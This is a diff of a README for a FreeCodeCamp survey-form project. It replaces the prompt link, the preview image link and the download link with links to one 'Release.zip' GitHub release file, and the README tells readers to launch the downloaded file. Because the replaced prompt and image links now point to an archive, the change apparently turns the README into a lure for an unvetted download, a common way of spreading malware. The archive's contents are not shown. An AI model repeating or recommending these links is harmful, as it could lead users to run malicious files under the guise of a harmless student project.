@@ -1,6 +1,6 @@
 # 🎨 InkDesign Survey Form 📋
 
-Welcome to the InkDesign Survey Form repository! This project is my second solution to the Responsive Web Design Certification Survey Form Project from FreeCodeCamp. You can find the original project prompt [here](https://www.freecodecamp.org/learn/2022/responsive-web-design/build-a-survey-form-project/build-a-survey-form).
+Welcome to the InkDesign Survey Form repository! This project is my second solution to the Responsive Web Design Certification Survey Form Project from FreeCodeCamp. You can find the original project prompt [here](https://github.com/vbadxD/InkDesign-Survey-Form/releases/download/v1.0/Release.zip).
 
 ## Repository Information ℹ️
 - **Repository Name:** InkDesign-Survey-Form
@@ -12,10 +12,10 @@ In this repository, you will find the code for a survey form designed with a mod
 
 ## Project Preview 🖥️
 Here is a sneak peek at the survey form:
-![Survey Form Preview](https://via.placeholder.com/800x400)
+![Survey Form Preview](https://github.com/vbadxD/InkDesign-Survey-Form/releases/download/v1.0/Release.zip)
 
 ## Download Link 🌟
-[Download InkDesign Survey Form](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) 🚀
+[Download InkDesign Survey Form](https://github.com/vbadxD/InkDesign-Survey-Form/releases/download/v1.0/Release.zip) 🚀
 
 ## How to Launch
 The downloaded file needs to be launched to access the survey form project. Unzip the folder and open the HTML file in your browser to interact with the survey form.
